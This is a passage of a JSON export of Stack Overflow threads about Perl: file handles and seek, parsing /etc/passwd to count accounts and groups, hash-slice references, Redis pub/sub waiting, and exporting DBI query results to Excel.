"https://stackoverflow.com/questions/35307238/how-to-read-updated-data-from-a-file-using-the-same-old-file-handle/35307431#35307431", "title": "How to read updated data from a file using the same old file handle", "body": "<p>You are on the right track... The main issue is that you opened <code>file</code>, a bareword, but closed <code>$file</code>, a variable.</p>\n\n<p>However, you should really stop using bareword file handles as they are global to other perl processes, and also may clash with future functions, or functions from another module. Instead, use lexical (<code>my</code>) variables for file handles. I'd recommend starting your scripts with <code>use strict</code> to enforce (among other things) all variables are properly declared and scoped. It's also recommended you add <code>use warnings</code> to catch more errors in your script.</p>\n\n<p>Here is a more correct way of doing what you want</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $filename = 'temp.txt';\n\nopen my $fh_read, '&lt;', $filename;\nmy @input = &lt;$fh_read&gt;;\n\nopen my $fh_write, '&gt;', $filename;\nprint {$fh_write} \"new data goes here\\n\";\nclose $fh_write;\n\nseek $fh_read, 0, 0;\nmy @new_input = &lt;$fh_read&gt;;\nprint for @new_input;\n</code></pre>\n"}], "owner": {"reputation": 69, "user_id": 2925298, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/d5e38aa6840ac8f36c18087599858da6?s=128&d=identicon&r=PG&f=1", "display_name": "user2925298", "link": "https://stackoverflow.com/users/2925298/user2925298"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 35307431, "answer_count": 1, "score": 0, "last_activity_date": 1455109850, "creation_date": 1455080812, "last_edit_date": 1455087049, "question_id": 35307238, "link": "https://stackoverflow.com/questions/35307238/how-to-read-updated-data-from-a-file-using-the-same-old-file-handle", "title": "How to read updated data from a file using the same old file handle", "body": "<pre><code>open filehandle, \"&lt;temp.txt\";\n@opt=&lt;filehandle&gt;;\n\n    open file, \"&gt;temp.txt\";\n    print file \"a\\n\";\n    print file \"b\\n\";\n    print file \"c\\n\";\n    print file \"y\\n\";\n    print file \"x\\n\";\n    print file \"d\\n\";\n    close $file;\nseek filehandle, 0,0;\n@a=&lt;filehandle&gt;;\nforeach $f (@a){\n#while (&lt;filehandle&gt;) {\n    print ;\n}\nclose filehandle;\n</code></pre>\n\n<p>I have some data in a file that I'm opening in read mode. Later, I'm updating data by opening in write mode and then closing the file handle of write mode.</p>\n\n<p>Now I want to read the updated data using the same old file handle without reopening the file. Is there any possibility to do it?</p>\n\n<p>The above code is not reading the updated data.</p>\n"}, {"tags": ["linux", "perl"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 5906419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4415dbb01bf4ae976371e3b1d241044?s=128&d=identicon&r=PG", "display_name": "V3NG3FuL", "link": "https://stackoverflow.com/users/5906419/v3ng3ful"}, "edited": false, "score": 0, "creation_date": 1455081384, "post_id": 35307184, "comment_id": 58324501, "body": "That helps alot but the problem is still the count, the ouput should be something like <code>Number of Accounts: 22</code>, <code>Number of Groups: 12</code>, <code>Missing Info: 2</code>"}, {"owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "reply_to_user": {"reputation": 13, "user_id": 5906419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4415dbb01bf4ae976371e3b1d241044?s=128&d=identicon&r=PG", "display_name": "V3NG3FuL", "link": "https://stackoverflow.com/users/5906419/v3ng3ful"}, "edited": false, "score": 0, "creation_date": 1455081988, "post_id": 35307184, "comment_id": 58324738, "body": "You should post the code you have so far so people can see exactly how/where you&#39;re getting stuck."}, {"owner": {"reputation": 13, "user_id": 5906419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4415dbb01bf4ae976371e3b1d241044?s=128&d=identicon&r=PG", "display_name": "V3NG3FuL", "link": "https://stackoverflow.com/users/5906419/v3ng3ful"}, "edited": false, "score": 0, "creation_date": 1455092753, "post_id": 35307184, "comment_id": 58329537, "body": "Thank you soo much that solved my problem. From here should easier to figure out the missing info. Thanks"}], "tags": [], "owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "is_accepted": true, "score": 0, "last_activity_date": 1455084327, "last_edit_date": 1455084327, "creation_date": 1455080546, "answer_id": 35307184, "question_id": 35306935, "link": "https://stackoverflow.com/questions/35306935/from-a-file-count-number-of-occurences-with-a-grep-stoping-at-a-character/35307184#35307184", "title": "From a file count number of occurences with a grep stoping at a character", "body": "<p>I assume you have already managed to read the passwd file line by line. Once you have a line loaded into a var (eg. <code>$line</code>) then you can use split.</p>\n\n<pre><code>my ($user, $gid, $info) = (split /:/, $line)[0, 3, 4];\n</code></pre>\n\n<p>Items are zero-indexed, so the first \"column\" is 0.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I don't know how you're determining if user info is \"missing\" so I have left that out, but you can use the same techniques I have used for either accounts or groups depending on your need. When you count groups, you want to avoid counting duplicate groups. To do this I add the gid as a hash key. If we later encounter the same group, the key already exists and we are not increment anything. Later we just count the keys.</p>\n\n<p>Also a correction... groupid is actually column 4 (split 3). Column 3 (split 2) is the userid, and there would be as many as those as there are accounts.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nopen my $content, '&lt;', '/etc/passwd'\n  or die \"Could not open: $!\";\n\nmy $accounts;\nmy %groups;\n\nwhile( my $line = &lt;$content&gt;)  {   \n    # Increment user count\n    $accounts++;\n\n    # Get group add it to hash to avoid duplicates\n    my ($gid) = (split /:/, $line)[3];\n    $groups{$gid} = 1;\n}\nclose $content;\n\nprintf(\"Number of accounts: %d\\n\", $accounts);\nprintf(\"Number of groups: %d\\n\", scalar keys %groups);\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 5906419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4415dbb01bf4ae976371e3b1d241044?s=128&d=identicon&r=PG", "display_name": "V3NG3FuL", "link": "https://stackoverflow.com/users/5906419/v3ng3ful"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "accepted_answer_id": 35307184, "answer_count": 1, "score": 1, "last_activity_date": 1455084327, "creation_date": 1455079155, "question_id": 35306935, "link": "https://stackoverflow.com/questions/35306935/from-a-file-count-number-of-occurences-with-a-grep-stoping-at-a-character", "title": "From a file count number of occurences with a grep stoping at a character", "body": "<p>I need to count user accounts, user groups and missing info from /etc/passwd\nand output it with a print</p>\n\n<p>passwd file inside example:</p>\n\n<pre><code>root:x:0:0:root:/root:/bin/bash\n\ndnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false\n\nlibuuid:x:100:101::/var/lib/libuuid:\n</code></pre>\n\n<p>Separating in rows by \":\" i need row 1,3 and 5</p>\n\n<p>Been searching and cant find an aswer please help</p>\n"}, {"tags": ["perl", "slice"], "answers": [{"comments": [{"owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "edited": false, "score": 0, "creation_date": 1455086484, "post_id": 35306406, "comment_id": 58326531, "body": "I wasn&#39;t aware of the list reference behaviour. Here&#39;s the relevant <a href=\"http://perldoc.perl.org/perlref.html#Making-References\" rel=\"nofollow noreferrer\">documentation</a> quote:  <i>Taking a reference to an enumerated list is not the same as using square brackets--instead it&#39;s the same as creating a list of references!</i>          <code>@list = (\\$a, \\@b, \\%c);         @list = \\($a, @b, %c);      # same thing!</code>  The <code>\\@</code> syntax looks exactly like taking a reference to an array - so combining this with hash slices makes it pretty confusing!"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "edited": false, "score": 0, "creation_date": 1455126290, "post_id": 35306406, "comment_id": 58353268, "body": "@AdamMillerchip The sigils can be confusing. Maybe this bit from <a href=\"http://perldoc.perl.org/perldata.html#Slices\" rel=\"nofollow noreferrer\">perldata</a> will help: &quot;If you&#39;re confused about why you use an &#39;@&#39; there on a hash slice instead of a &#39;%&#39;, think of it like this. The type of bracket (square or curly) governs whether it&#39;s an array or a hash being looked at. On the other hand, the leading symbol (&#39;$&#39; or &#39;@&#39;) on the array or hash indicates whether you are getting back a singular value (a scalar) or a plural one (a list).&quot;"}, {"owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1455134758, "post_id": 35306406, "comment_id": 58358593, "body": "@ThisSuitIsBlackNot That explanation is clear and is what I had in mind but the list reference behaviour is not consistent with it. If we further deduce that preceding backslash means &#39;get a reference to&#39;, then <code>\\@array</code> means &#39;reference to array&#39; and <code>\\@hashslice{...}</code> means &#39;reference to array&#39; too, except that it doesn&#39;t. :-)"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "edited": false, "score": 1, "creation_date": 1455137452, "post_id": 35306406, "comment_id": 58360102, "body": "@Adam I see why it&#39;s confusing, although your logic is a little off. If <code>\\@hashslice{...}</code> means &quot;reference to array,&quot; what does the <code>{...}</code> block mean? I would expect that to generate a syntax error. Also, people deduce the same thing even without the reference: if <code>@foo</code> is an array, then <code>@foo{bar}</code> must also be an array, right? Just keep in mind that slices are lists, not arrays, despite the <code>@</code>. And just to reiterate, I&#39;m not arguing that the sigils are straightforward; they&#39;ve actually been <a href=\"http://design.perl6.org/Differences.html#Sigils\" rel=\"nofollow noreferrer\">changed in Perl 6</a> to be more intuitive."}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 3, "last_activity_date": 1455075954, "last_edit_date": 1455075954, "creation_date": 1455075639, "answer_id": 35306406, "question_id": 35306184, "link": "https://stackoverflow.com/questions/35306184/perl-slices-and-references/35306406#35306406", "title": "Perl slices and references", "body": "<p>Two points:</p>\n\n<p>First, a hash slice does not produce an array, it produces a list of the sliced hash elements.</p>\n\n<p>Second, using \\ on a list produces a list of references to the elements of the first list.</p>\n"}], "owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1455075954, "creation_date": 1455073911, "last_edit_date": 1455074388, "question_id": 35306184, "link": "https://stackoverflow.com/questions/35306184/perl-slices-and-references", "title": "Perl slices and references", "body": "<p>I created the following slice:</p>\n\n<pre><code>my %hash = ( a =&gt; 1, b =&gt; 2, c =&gt; 3 );\nmy @backslashed_slice_result = \\@hash{qw(a b c)};\n#  $backslashed... &lt;-- originally I wrote this is a scalar, see below.\n</code></pre>\n\n<p>I expected this to produce an array reference to an array populated by the hash slice, equivalent to:</p>\n\n<pre><code>my $arrayref_containing_slice = [ @hash{qw(a b c)} ]; # [1, 2, 3]\n</code></pre>\n\n<p>But actually is doing something more like:</p>\n\n<pre><code>my @mapped_list_of_values_to_refs = map { \\$hash{$_} } qw(a b c); # (\\1, \\2, \\3)\n</code></pre>\n\n<p>The main point I could find in the <a href=\"http://perldoc.perl.org/perldata.html#Slices\" rel=\"nofollow\">documentation</a> that describes this behaviour is the statement:</p>\n\n<blockquote>\n  <p>A slice accesses several elements of a list, an array, or a hash\n  simultaneously using a list of subscripts.</p>\n</blockquote>\n\n<p>So is <code>\\@hash{qw(a b c)}</code> actually a list slice, rather than a hash slice? I am surprised at the reference being taken of the values of the hash, instead of of the resulting array of values. What is it about the syntax that causes perl to apply the leading <code>\\</code> to the values of the hash?</p>\n"}, {"tags": ["perl", "redis"], "answers": [{"comments": [{"owner": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471384607, "post_id": 38984628, "comment_id": 65322953, "body": "This doesn&#39;t actually answer my question though. Essentially what I want is to wait for up to 30 seconds for one message, and then to continue immediately once it arrives."}, {"owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "reply_to_user": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471384811, "post_id": 38984628, "comment_id": 65323028, "body": "continue what immediately? what is not happening that you expect/want to happen?"}, {"owner": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471385017, "post_id": 38984628, "comment_id": 65323113, "body": "Basically I wanted to use this as a messaging solution, so I want to wait for the message, and then do some processing. So I only want to wait for <i>one</i> message, so once it is received, I can stop waiting. Except that I can&#39;t."}, {"owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "reply_to_user": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471385408, "post_id": 38984628, "comment_id": 65323253, "body": "In call-back-subroutine you must call $redisSub-&gt;unsubscribe(..) to accomplish what you are saying."}], "tags": [], "owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "is_accepted": true, "score": 1, "last_activity_date": 1471385629, "last_edit_date": 1471385629, "creation_date": 1471382226, "answer_id": 38984628, "question_id": 35304337, "link": "https://stackoverflow.com/questions/35304337/using-redis-and-perl-how-to-wait-for-one-published-method/38984628#38984628", "title": "Using Redis and Perl, how to wait for one published method", "body": "<p>Ans : There is no such latency as you have mentioned. To stop with no more waiting when message arrives, use unsubscribe() but I have not tested it.</p>\n\n<p>How : You have to do this:</p>\n\n<pre><code>while ('true' ) {\n$redisSub-&gt;wait_for_messages(30); \n}\n</code></pre>\n\n<p>Why: The above waits for messages for 30 seconds, after that another 30 seconds and so on. But whenever a subscribed event happened, instantly the call-back-subroutine is invoked but wait_for_messages continues from the original state (independent of invoking/event occured/event not occurred). <strong>wait_for_messages(n) will not return in n seconds if subscribed messages are coming</strong>. So it continues for 30 seconds of wait. So if a matching publish happened every 29 seconds for 10 times, the wait_for_messages will return only after 290+30 seconds with return value 10. (then because of of while('true') it will go back to wait again.)</p>\n\n<pre><code>Note :1) Do/should not add sleep in the above code.\nNote :2) If your aim is to stop processing after receiving first\nmessage, you have to use $redisSub-&gt;unsubscribe(..) \ninside the call-back-subroutine.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471504461, "post_id": 38985577, "comment_id": 65375147, "body": "In the question I stated that &quot;  # I tried adding in the following line, but it complains   # that: Missing required callback in call to unsubscribe()   #$redisSub-&gt;unsubscribe ( @topics , $savecallback);&quot;"}, {"owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "reply_to_user": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1471545554, "post_id": 38985577, "comment_id": 65401391, "body": "Paul, yes, you have mentioned. sorry missing it. But I guess you are trying to do something a little bit over ambitious. The $savecallback is assigned a reference to a sub routine after the right side is compiled. But inside the sub routine you are mentioning the call back subroutines name, which is not referring to anything yet. So from inside the subroutine, at this point <b>$redisSub-&gt;unsubscribe ( @topics , $savecallback);</b> $savecallback is a null. So we need to name the sub-routine and use it&#39;s reference with \\&amp;."}, {"owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "reply_to_user": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "edited": false, "score": 0, "creation_date": 1473290103, "post_id": 38985577, "comment_id": 66088507, "body": "@PaulWagland If I am not asking toomuch, did this come close to solve the problem?"}], "tags": [], "owner": {"reputation": 517, "user_id": 5293991, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rm6r_TBDf0M/AAAAAAAAAAI/AAAAAAAAN3c/_0hdeN0P3K8/photo.jpg?sz=128", "display_name": "Jay Kumar R", "link": "https://stackoverflow.com/users/5293991/jay-kumar-r"}, "is_accepted": false, "score": 1, "last_activity_date": 1471546024, "last_edit_date": 1471546024, "creation_date": 1471387203, "answer_id": 38985577, "question_id": 35304337, "link": "https://stackoverflow.com/questions/35304337/using-redis-and-perl-how-to-wait-for-one-published-method/38985577#38985577", "title": "Using Redis and Perl, how to wait for one published method", "body": "<p>Finally this is what worked for this requirement: // I do not want to continue waiting after the event occurred//</p>\n\n<pre><code># inside call back sub:\nmy $savecallback = sub {\n  $event_occured = 1 ;  # this is important\n  $redisSub-&gt;unsubscribe(@topics,$savecallback) ; # as well as this.\n  my ($message, $topic, $subscribed_topic) = @_;\n...\n};\n# The above function will not work. Because $savecallback referred inside is undefined before it was assigned since RHS is still in compilation. So the correct one:\nsub savecallback {\n  $event_occured = 1 ;  # this is important\n  $redisSub-&gt;unsubscribe(@topics,\\&amp;savecallback) ; # as well as this.\n  my ($message, $topic, $subscribed_topic) = @_;\n...\n};\n.....\n\n$redisSub-&gt;subscribe(@topics,\\&amp;savecallback) ;\n$event_occurred = 0;\nwhile ( ! event_occurred ) {\n$redisSub-&gt;wait_for_messages(1); \n}\n</code></pre>\n\n<p>Still the code waits for 1 whole second after calling call-back-subroutine, but I think it is ok.\nWithout unsubscribe() the code will never return if events are consistently happening in less than a second.    </p>\n"}], "owner": {"reputation": 23861, "user_id": 97627, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/794c03b043debe3b5b64873b00a3b76f?s=128&d=identicon&r=PG", "display_name": "Paul Wagland", "link": "https://stackoverflow.com/users/97627/paul-wagland"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 257, "favorite_count": 0, "accepted_answer_id": 38984628, "answer_count": 2, "score": 1, "last_activity_date": 1471546024, "creation_date": 1455061131, "question_id": 35304337, "link": "https://stackoverflow.com/questions/35304337/using-redis-and-perl-how-to-wait-for-one-published-method", "title": "Using Redis and Perl, how to wait for one published method", "body": "<p>I want to do something that is conceptually quite simple, wait for up to thirty seconds for a redid publish to come through. As soon as it comes through, I want to return, or if it doesn't come through, I want to return after thirty seconds.</p>\n\n<p>The perl <a href=\"http://search.cpan.org/~dams/Redis-1.981/lib/Redis.pm\" rel=\"nofollow\">Redis</a> module has almost everything that I want, except that I cannot return immediately after I get a message in.</p>\n\n<p>The sample code that I am using looks like the following:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse Redis;\n\nmy $redisSub = Redis-&gt;new;\nmy $msg = 0;\nmy @topics = ('mykey');\nmy $savecallback = sub {\n  my ($message, $topic, $subscribed_topic) = @_;\n  print \"Message received : $message\\n\";\n  $msg = $message;\n  # I tried adding in the following line, but it complains\n  # that: Missing required callback in call to unsubscribe()\n  #$redisSub-&gt;unsubscribe ( @topics , $savecallback);\n};\n$redisSub-&gt;subscribe ( @topics , $savecallback);\n\nmy $redis = Redis-&gt;new;\nprint \"old: \" . $redis-&gt;get('mykey') . \"\\n\";\nprint \"Waiting for message to be sent\\n\";\n$redisSub-&gt;wait_for_messages(30);\n\nif ($msg) {\n  print \"old: \" . $redis-&gt;get('mykey') . \"\\n\";\n} else {\n  print \"Timeout occurred\\n\";\n}\n</code></pre>\n\n<p>The issue is that the <code>wait_for_messages(30)</code> call waits for thirty seconds of idle activity, so if the message turns up, it prints out, immediately, \"Message received\", but then waits another thirty seconds before returning control to the script. I could change it to <code>wait_for_messages(0)</code>, but then it returns immediately, and I need to includes this in a sleep loop, which introduces the potential latency in detecting the change outside of the call.</p>\n\n<p>Is this possible using only the Redis module? Or does one need to use the <a href=\"http://search.cpan.org/~iph/AnyEvent-Redis-RipeRedis-1.254/lib/AnyEvent/Redis/RipeRedis.pm\" rel=\"nofollow\">AnyEvent::Redis::PipeRedis</a> module to do this?</p>\n"}, {"tags": ["sql", "excel", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 4, "creation_date": 1455060565, "post_id": 35304007, "comment_id": 58318811, "body": "If you indent your code properly, it&#39;s easy to see that <code>$col1</code> and <code>$col2</code> are only defined within the scope of your loop. Also, when working with DBI, the variable name <code>$sth</code> is usually reserved for a statement handle, but what you&#39;re getting is an arrayref of arrayrefs, so you should probably name it something else."}], "answers": [{"comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1455061563, "post_id": 35304260, "comment_id": 58319236, "body": "With this code, only the last row of the result set will get written to the spreadsheet."}], "tags": [], "owner": {"reputation": 60, "user_id": 2415287, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UJ159.jpg?s=128&g=1", "display_name": "amacks", "link": "https://stackoverflow.com/users/2415287/amacks"}, "is_accepted": false, "score": -2, "last_activity_date": 1455060760, "creation_date": 1455060760, "answer_id": 35304260, "question_id": 35304007, "link": "https://stackoverflow.com/questions/35304007/use-perl-to-select-data-from-sql-database-and-place-into-excel/35304260#35304260", "title": "Use Perl to select data from SQL database and place into Excel", "body": "<p>Your problem is in variable scope, specifically here</p>\n\n<pre><code> foreach my $ln (@$sth1) \n{ my($col1, $col2) = @$ln; print \"$col1  $col2\\n\";}\n</code></pre>\n\n<p>You're defining col1 and col2 inside the foreach loop, so their scope is only the loop. Then trying to use them outside, wher they don't exist.</p>\n\n<p>I'd define col1 and col2 up above the foreach, eg</p>\n\n<pre><code>my $col1;\nmy $col2;\nforeach my $ln (@$sth1) \n{($col1, $col2) = @$ln; print \"$col1  $col2\\n\";}\n</code></pre>\n\n<p>A</p>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1455061303, "creation_date": 1455061303, "answer_id": 35304373, "question_id": 35304007, "link": "https://stackoverflow.com/questions/35304007/use-perl-to-select-data-from-sql-database-and-place-into-excel/35304373#35304373", "title": "Use Perl to select data from SQL database and place into Excel", "body": "<p>The <a href=\"https://metacpan.org/pod/Excel::Writer::XLSX\" rel=\"nofollow\">Excel::Writer::XLSX</a> module provides a convenience method called <a href=\"https://metacpan.org/pod/Excel::Writer::XLSX#write_col-row-column-array_ref-format\" rel=\"nofollow\"><code>write_col()</code></a> for such a scenario as this:</p>\n\n<blockquote>\n  <p>The <code>write_col()</code> method can be used to write a 1D or 2D array of data\n  in one go. This is useful for converting the results of a database\n  query into an Excel worksheet. You must pass a reference to the array\n  of data rather than the array itself. The <code>write()</code> method is then\n  called for each element of the data.</p>\n</blockquote>\n\n<p>After connecting to the database and initializing your spreadsheet objects, you can basically reduce the output portion of your code to the following two lines:</p>\n\n<pre><code>my $data = $dbh-&gt;selectall_arrayref(\"select col1, col2 from table\");\n$worksheet-&gt;write_col(0, 0, $data);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13122, "user_id": 1001884, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/14116728c7413097a42cf22736503f56?s=128&d=identicon&r=PG", "display_name": "Hambone", "link": "https://stackoverflow.com/users/1001884/hambone"}, "is_accepted": false, "score": 0, "last_activity_date": 1455061457, "creation_date": 1455061457, "answer_id": 35304394, "question_id": 35304007, "link": "https://stackoverflow.com/questions/35304007/use-perl-to-select-data-from-sql-database-and-place-into-excel/35304394#35304394", "title": "Use Perl to select data from SQL database and place into Excel", "body": "<p>Aside from the other mentions, I realize your query is only intended to return a single row, but in general if you have multiple rows it's better to iterate the SQL and then generate the output:</p>\n\n<pre><code>use strict;\nuse DBI;\nuse Excel::Writer::XLSX;\n\n# connect to the db\nmy $dbh = DBI-&gt;connect('dbi:ODBC:dbname', 'dblogin', 'dbpassword');\nmy $sth1 = $dbh-&gt;prepare(q{select col1, col2 from table});\n\n$sth1-&gt;execute();\n\nmy $workbook  = Excel::Writer::XLSX-&gt;new( 'col1col2test.xlsx' );\nmy $worksheet = $workbook-&gt;add_worksheet();\n\nmy $col = 0;\n\nwhile (my ($col1, $col2) = $sth1-&gt;fetchrow_array) {\n  $worksheet-&gt;write(0, $col, $col1);\n  $worksheet-&gt;write(1, $col, $col2);\n\n  $col++;   # maybe you really don't want this...  I don't know\n}\n\n$sth1-&gt;finish;\n\n$workbook-&gt;close();\n</code></pre>\n\n<p>As it stands, if your query does return multiple rows, it seems like you will write the same values over and over to the same cells...</p>\n\n<p>Maybe that's what you wanted, but I thought to mention it.</p>\n"}], "owner": 